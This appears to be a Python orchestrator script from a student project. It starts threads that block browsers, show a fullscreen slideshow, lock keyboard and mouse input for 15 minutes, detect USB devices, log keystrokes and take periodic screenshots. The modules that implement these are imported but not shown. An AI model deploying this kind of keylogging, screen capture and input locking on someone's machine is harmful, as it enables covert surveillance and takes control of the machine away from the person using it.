import threading
from modules.app_and_process_blocker import process_blocker
from modules.broadcast import fullscreen_image_slideshow
from modules.input_blocker import block_input_15min
from modules.external_device_detector import start_usb_watcher
from modules.keylog import start_keyboard_logger as _start_keyboard_logger
from modules.screenshots import start_screen_capture_worker as _start_screen_capture


# feature flags
p1 = True    # process blocker
p2 = True   # slideshow
p3 = True    # input blocker (15 min)
p4 = True     # USB detector
p5 = True    # keyboard logger
p6 = True   # screen capture


def start_process_blocker():
    t = threading.Thread(
        target=process_blocker,
        kwargs={
            "blocked": {"chrome.exe", "firefox.exe", "msedge.exe"},
            "scan_interval": 0.4
        },
        daemon=True
    )
    t.start()
    return t


def start_slideshow():
    t = threading.Thread(
        target=fullscreen_image_slideshow,
        kwargs={
            "image_dir": r"C:\coding\FP Project\images",
            "change_interval_ms": 1000,
            "folder_scan_interval_ms": 2000,
        },
        daemon=True
    )
    t.start()
    return t


def start_input_blocker():
    t = threading.Thread(
        target=block_input_15min,
        daemon=True
    )
    t.start()
    return t


# USB callback owned by orchestrator
def on_usb_connected():
    print("[orchestrator] USB device connected!")

def on_usb_disconnected():
    print("[orchestrator] USB device disconnected!")    


def start_usb_detector():
    start_usb_watcher(on_usb_connected,on_usb_disconnected)


def start_keyboard_logger_worker():
    t = threading.Thread(
        target=_start_keyboard_logger,
        daemon=True
    )
    t.start()
    return t


def start_screen_capture_worker(interval=5):
    t = threading.Thread(
        target=_start_screen_capture,
        kwargs={"interval": interval},
        daemon=True
    )
    t.start()
    return t

def main():
    print("[orchestrator] starting")

    pb_thread = None
    slideshow_thread = None
    input_blocker_thread = None
    keyboard_thread = None
    screen_thread = None

    if p1:
        pb_thread = start_process_blocker()

    if p2:
        slideshow_thread = start_slideshow()

    if p3:
        input_blocker_thread = start_input_blocker()

    if p4:
        start_usb_detector()

    if p5:
        keyboard_thread = start_keyboard_logger_worker()

    if p6:
        screen_thread = start_screen_capture_worker()

    while True:
        
        if p1 and pb_thread and not pb_thread.is_alive():
            print("[orchestrator] process blocker died")

        if p2 and slideshow_thread and not slideshow_thread.is_alive():
            print("[orchestrator] slideshow died")

        if p3 and input_blocker_thread and not input_blocker_thread.is_alive():
            print("[orchestrator] input blocker finished")

        if p5 and keyboard_thread and not keyboard_thread.is_alive():
            print("[orchestrator] keyboard logger died")

        if p6 and screen_thread and not screen_thread.is_alive():
            print("[orchestrator] screen capture died")

        # USB is callback-driven
        pass


if __name__ == "__main__":
    main()
